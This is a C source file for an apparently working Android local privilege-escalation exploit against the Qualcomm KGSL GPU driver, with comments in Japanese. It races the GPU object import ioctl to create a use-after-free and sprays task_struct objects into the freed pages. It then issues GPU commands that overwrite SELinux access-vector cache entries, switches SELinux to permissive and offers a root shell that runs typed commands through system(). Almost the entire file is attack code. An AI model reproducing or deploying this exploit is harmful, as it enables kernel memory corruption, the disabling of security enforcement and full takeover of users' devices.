

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/sysmacros.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <dirent.h>
#include <time.h>
#include <signal.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

/* sauce と同一の定数 (Phase 1-3) */
#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_ADDR 0x7001fe000ULL
#define OVERLAP_SIZE 0x7000ULL
#define BOGUS_ADDR 0x700204000ULL
#define BOGUS_SIZE 0xffffffffffefd000ULL
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

/* AVC flip 定数 (Snapdragon 855 用オフセット) */
#define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
#define AVC_NODE_STRIDE  72
#define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)
#define AVC_PAGES_PER_IB 12
#define AVC_LOOP_SECONDS 150

#define SPRAY_PIDS 2000
#define CHURN_MAX_PATHS 4096

static int kgsl_fd = -1;
static volatile int race_done = 0;
static uint64_t alloc_flags = 0;
static int uaf_id = -1, ph_id = -1;

/* ============ KGSL 基本操作 (sauce と同パターン) ============ */

static void die(const char *msg) { perror(msg); exit(1); }

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}

static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

/* ============ Phase A1-A4: 自前 UAF 作成 (sauce Phase 1-4 移植) ============ */

static void phase1_rbtree(void) {
    alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);

    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");

    ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");

    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
        (unsigned long)PLACEHOLDER_ADDR);
}

static void *race_thread(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

static int phase2_race(void) {
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race %d/5000000 errno=%d\n", i, e);
    }

    race_done = 1;
    pthread_join(thr, NULL);
    if (!hit) { printf("[-] Race failed\n"); return 0; }
    printf("[+] Race won!\n");
    return 1;
}

static void phase3_free_uaf(void) {
    gpuobj_free(uaf_id);
    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));
}

static void phase4_reclaim(void) {
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);
}

/* ============ チャーン (AVC miss 生成) ============ */

static const char *churn_dirs[] = {
    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
    "/dev", "/proc",
};
#define CHURN_MAX_PATHS 20000
static char churn_paths[CHURN_MAX_PATHS][160];
static int churn_npaths = 0;
static int churn_built = 0;

static void churn_walk(const char *dir, int depth) {
    if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
    DIR *d = opendir(dir);
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d)) != NULL && churn_npaths < CHURN_MAX_PATHS) {
        if (de->d_name[0] == '.') continue;
        char p[192];
        snprintf(p, sizeof(p), "%s/%s", dir, de->d_name);
        int fd = open(p, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
        churn_npaths++;
        churn_walk(p, depth + 1);
    }
    closedir(d);
}

static void churn_build(void) {
    if (churn_built) return;
    for (unsigned d = 0; d < sizeof(churn_dirs)/sizeof(churn_dirs[0]) &&
         churn_npaths < CHURN_MAX_PATHS; d++) {
        churn_walk(churn_dirs[d], 0);
    }
    churn_built = 1;
    printf("[CHURN] %d paths\n", churn_npaths);
}

static void churn_round(void) {
    churn_build();
    for (int i = 0; i < churn_npaths; i++) {
        int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
    }
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s >= 0) { close(s); }
    s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s >= 0) {
        struct sockaddr_un su = { .sun_family = AF_UNIX };
        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
        bind(s, (struct sockaddr *)&su, sizeof(su));
        close(s);
        unlink("/data/local/tmp/cs.sock");
    }
    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
}

static int avc_entries(void) {
    int fd = open("/sys/fs/selinux/avc/hash_stats", O_RDONLY);
    if (fd < 0) return -1;
    char buf[256];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = 0;
    int e = -1;
    if (sscanf(buf, "entries: %d", &e) != 1) return -1;
    return e;
}

/* setenforce 0: 書き込み成功 (flip 成功 or 既に permissive) で 1 */
static int try_setenforce0(void) {
    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
    if (fd < 0) return 0;
    ssize_t w = write(fd, "0", 1);
    close(fd);
    return (w == 1);
}

/* ============ GPU スキャン + flip ============ */

/* UAF 範囲の全ページから TASKUAF!! comm を含む task_struct ページを記録 */
#define PRE_SCAN_DWORDS 560
#define PRE_PAGES_PER_IB 4
static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                              void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                              uint64_t scan_start, uint64_t end_va,
                              uint64_t *out_vas, int maxout) {
    uint32_t *cmd = (uint32_t *)ib_m;
    uint32_t *data = (uint32_t *)dst_m;
    int n = 0, dw;
    unsigned int ts;
    uint64_t va = scan_start;
    while (va < end_va && n < maxout) {
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, PRE_PAGES_PER_IB * PRE_SCAN_DWORDS * 4);
        dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        int batch = 0;
        if (((va - scan_start) & 0xFFFFF) == 0) { printf("."); fflush(stdout); }
        for (; batch < PRE_PAGES_PER_IB && va < end_va; batch++, va += 0x1000) {
            for (int w = 0; w < PRE_SCAN_DWORDS; w++) {
                uint32_t dl, dh, sl, sh;
                split64(dst_ga + (batch * PRE_SCAN_DWORDS + w) * 4, &dl, &dh);
                split64(va + w * 4, &sl, &sh);
                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                cmd[dw++] = sl; cmd[dw++] = sh;
            }
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(ctx_id, ts) < 0) break;
        __sync_synchronize();
        uint64_t pva = va - batch * 0x1000;
        for (int p = 0; p < batch; p++) {
            uint32_t *pd = &data[p * PRE_SCAN_DWORDS];
            int found = 0;
            for (int i = 0; i < PRE_SCAN_DWORDS - 1 && !found; i++)
                if (pd[i] == 0x4B534154 && pd[i+1] == 0x21464155) found = 1;
            if (found && n < maxout) {
                out_vas[n++] = pva + p * 0x1000;
                printf("[TASKPG] va=0x%lx\n", (unsigned long)(pva + p * 0x1000));
            }
        }
    }
    return n;
}

/* (tsid==2 && tclass==1) の avc_node を allowed=0xffffffff に書き換える (Snapdragon 855 オフセット) */
static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                           void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                           uint64_t *vas, int npages, int verbose) {
    uint32_t *cmd = (uint32_t *)ib_m;
    uint32_t *data = (uint32_t *)dst_m;
    int total_flips = 0, idx = 0;
    unsigned int ts;

    while (idx < npages) {
        int batch = npages - idx;
        if (batch > AVC_PAGES_PER_IB) batch = AVC_PAGES_PER_IB;
        int node_dws = batch * AVC_NODES_PER_PAGE * 4;
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, node_dws * 4);
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int p = 0; p < batch; p++) {
            uint64_t va = vas[idx + p];
            for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
                uint64_t node_va = va + n * AVC_NODE_STRIDE;
                /* オフセット 0x30 から 4 ワード読み込み (ssid, tsid, tclass, allowed) */
                uint32_t base_off = 0x30;
                for (int w = 0; w < 4; w++) {
                    uint32_t dl, dh, sl, sh;
                    uint32_t dofs = (p * AVC_NODES_PER_PAGE + n) * 4 + w * 4;
                    split64(dst_ga + dofs, &dl, &dh);
                    split64(node_va + base_off + w * 4, &sl, &sh);
                    cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                    cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                    cmd[dw++] = sl; cmd[dw++] = sh;
                }
            }
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(ctx_id, ts) < 0) break;
        __sync_synchronize();

        int fdw = 0, nb_flips = 0;
        uint32_t *fcmd = (uint32_t *)ib_m;
        fcmd[fdw++] = cp_type7(CP_NOP, 0);
        for (int p = 0; p < batch; p++) {
            uint64_t va = vas[idx + p];
            for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
                uint32_t *nd = &data[(p * AVC_NODES_PER_PAGE + n) * 4];
                uint32_t ssid = nd[0];
                uint32_t tsid = nd[1];
                uint32_t tclass_raw = nd[2];
                uint16_t tclass = (uint16_t)(tclass_raw & 0xffff);
                if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
                    /* allowed を 0xffffffff に書き換え (offset 0x3c) */
                    uint64_t allowed_va = va + n * AVC_NODE_STRIDE + 0x3c;
                    uint32_t sl, sh;
                    split64(allowed_va, &sl, &sh);
                    fcmd[fdw++] = cp_type7(CP_MEM_WRITE, 4);
                    fcmd[fdw++] = sl; fcmd[fdw++] = sh;
                    fcmd[fdw++] = 0xffffffff;
                    fcmd[fdw++] = 0;
                    nb_flips++;
                    if (verbose)
                        printf("[FLIP] va=0x%lx+0x%x sid=0x%x ts=0x%x class=0x%x allowed->0xffffffff\n",
                            (unsigned long)va, n * AVC_NODE_STRIDE + 0x3c,
                            ssid, tsid, tclass);
                }
            }
        }
        if (nb_flips > 0) {
            fcmd[fdw++] = cp_type7(CP_NOP, 0);
            __sync_synchronize();
            if (submit_ib(ctx_id, ib_ga, fdw*4, ib_id, &ts) == 0)
                wait_timestamp(ctx_id, ts);
        }
        total_flips += nb_flips;
        idx += batch;
    }
    return total_flips;
}

/* ============ task_struct spray (UAF ページ保持) ============ */

static pid_t spray_pids[SPRAY_PIDS];
static int n_spray = 0;

static void spawn_spray(void) {
    printf("[SPRAY] spawning...\n");
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (;;) usleep(200000);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    printf("[SPRAY] %d children\n", n_spray);
}

static void kill_spray_children(void) {
    int killed = 0;
    for (int i = 0; i < n_spray; i++) {
        kill(spray_pids[i], SIGKILL);
        killed++;
    }
    while (waitpid(-1, NULL, 0) > 0) ;
    printf("[KILL] %d spray children killed+reaped\n", killed);
}

/* ルートシェル (xh 互換) */
static void root_shell(void) {
    printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
    fflush(stdout);
    char buf[512];
    while (fgets(buf, sizeof(buf), stdin) != NULL) {
        if (strncmp(buf, "exit", 4) == 0 || strncmp(buf, "quit", 4) == 0) break;
        buf[strcspn(buf, "\n")] = 0;
        if (buf[0] == 0) continue;
        int st = system(buf);
        (void)st;
        printf("# ");
        fflush(stdout);
    }
    printf("[-] Root shell exited\n");
}

/* ============ main ============ */

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    bool want_shell = false;
    for (int i = 1; i < argc; i++)
        if (strcmp(argv[i], "-i") == 0) want_shell = true;

    printf("[*] avc_bypass v2: uid=%d euid=%d\n", getuid(), geteuid());
    {
        int fd = open("/proc/self/attr/current", O_RDONLY);
        if (fd >= 0) {
            char ctx[256]; ssize_t n = read(fd, ctx, sizeof(ctx) - 1);
            close(fd);
            if (n > 0) { ctx[n] = 0; printf("[*] SELinux: %s\n", ctx); }
        }
    }

    /* ===== 自前 UAF 作成 ===== */
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    printf("[*] Phase 1: Setup rbtree\n");
    phase1_rbtree();

    printf("[*] Phase 2: Race\n");
    if (!phase2_race()) { close(kgsl_fd); return 1; }

    printf("[*] Phase 3: Free UAF\n");
    phase3_free_uaf();

    printf("[*] Phase 4: Reclaim\n");
    phase4_reclaim();

    /* ===== spray: UAF ページを task_struct で保持 ===== */
    spawn_spray();

    unsigned int ctx_id = create_context();
    printf("[GPU] context=%u\n", ctx_id);

    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga);

    int dst_id = gpuobj_alloc(0x4000, alloc_flags);
    void *dst_m = gpuobj_mmap(0x4000, dst_id);
    uint64_t dst_ga = 0;
    gpuobj_info(dst_id, &dst_ga);

    printf("[GPU] ib_ga=0x%lx dst_ga=0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);

    /* UAF 写像の健全性チェック: 先頭 1KB の非ゼロ dword 数 (task_struct が載っていれば非ゼロ) */
    {
        uint32_t *cmd = (uint32_t *)ib_m;
        int dw = 0;
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < 256; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i * 4, &dl, &dh);
            split64(UAF_ADDR + 0x2000 + i * 4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        int nz = 0;
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
            wait_timestamp(ctx_id, ts);
            __sync_synchronize();
            uint32_t *data = (uint32_t *)dst_m;
            for (int i = 0; i < 256; i++) if (data[i] != 0) nz++;
        }
        printf("[UAF] sanity: nonzero dwords=%d/256 %s\n", nz,
            nz > 0 ? "(UAF alive)" : "(UAF looks empty)");
    }

    /* 1. プリスキャン: TASKUAF!! ページ記録 (kill 前に実施) */
    uint64_t task_pgs[4096];
    int n_task_pgs = prescan_task_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
        UAF_ADDR + 0x2000, UAF_ADDR + UAF_SIZE - 0x1000, task_pgs, 4096);
    printf("[*] pre-scan: %d task pages\n", n_task_pgs);

    /* 2. spray 子を kill (UAF ページを unmovable free として buddy へ) */
    kill_spray_children();
    usleep(100000);   /* 空 slab の buddy 返却待ち (直後に新 slab = タスクページ) */
    /* freelist を消費させ、以降の新 slab をタスクページに強制する */
    churn_build();
    for (int c = 0; c < 3; c++) churn_round();
    printf("[AVC] entries=%d (post-churn)\n", avc_entries());

    /* 3. フリップループ (最長 AVC_LOOP_SECONDS) */
    int flip_total = 0;
    int ok = 0;
    uint64_t t_start = time(NULL);
    uint64_t t_last_report = t_start;
    while (!ok && time(NULL) - t_start < AVC_LOOP_SECONDS) {
        int f1 = 0, f2 = 0;
        for (int i = n_task_pgs - 1; i >= 0; i -= AVC_PAGES_PER_IB) {
            int batch = (i + 1) >= AVC_PAGES_PER_IB ? AVC_PAGES_PER_IB : (i + 1);
            f1 += scan_flip_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
                                  &task_pgs[i - batch + 1], batch, 1);
            if (try_setenforce0()) { ok = 1; break; }
        }
        if (!ok) {
            for (uint64_t va = UAF_ADDR + 0x2000;
                 va < UAF_ADDR + UAF_SIZE - 0x1000;
                 va += AVC_PAGES_PER_IB * 0x1000) {
                uint64_t vas[AVC_PAGES_PER_IB];
                int nb = 0;
                for (int i = 0; i < AVC_PAGES_PER_IB &&
                     va + (uint64_t)i * 0x1000 < UAF_ADDR + UAF_SIZE - 0x1000; i++)
                    vas[nb++] = va + (uint64_t)i * 0x1000;
                f2 += scan_flip_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
                                      vas, nb, 1);
                if (try_setenforce0()) { ok = 1; break; }
            }
        }
        flip_total += f1 + f2;
        if (!ok) {
            churn_round();
            if (avc_entries() >= 0)
                printf("[AVC] entries=%d\n", avc_entries());
            if (try_setenforce0()) ok = 1;
        }
        if (time(NULL) - t_last_report >= 5) {
            printf("[*] t=%lus flips=%d ok=%d\n",
                (unsigned long)(time(NULL) - t_start), flip_total, ok);
            t_last_report = time(NULL);
        }
    }

    if (ok) {
        printf("[+] ### SETENFORCE 0 SUCCEEDED — SELinux permissive ###\n");
    } else {
        printf("[-] AVC bypass failed (flips=%d, %ds timeout)\n", flip_total, AVC_LOOP_SECONDS);
    }
    {
        int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
        if (fd >= 0) {
            char v[8]; ssize_t n = read(fd, v, sizeof(v) - 1);
            close(fd);
            if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
        }
    }

    if (want_shell && getuid() == 0) root_shell();
    return ok ? 0 : 1;
}
